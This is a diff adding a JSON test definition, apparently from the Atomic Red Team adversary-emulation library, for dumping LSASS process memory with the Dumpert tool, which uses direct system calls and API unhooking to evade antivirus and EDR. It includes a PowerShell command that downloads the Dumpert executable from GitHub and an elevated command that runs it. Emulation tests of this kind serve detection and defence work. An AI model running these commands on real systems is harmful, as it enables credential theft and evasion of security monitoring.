@@ -1,0 +1,38 @@
+{
+    "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
+    "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection.  https://github.com/outflanknl/Dumpert https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/ Upon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.  If you see a message saying \\The system cannot find the path specified.\\, try using the  get-prereq_commands to download the  tool first. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "\"#{dumpert_exe}\"\n",
+        "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "LSASS Memory",
+    "source": "ART",
+    "uuid": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
+    "arguments": {
+        "dumpert_exe": {
+            "description": "Path of Dumpert executable",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
+            "prereq_command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"#{dumpert_exe}\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"#{dumpert_exe}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
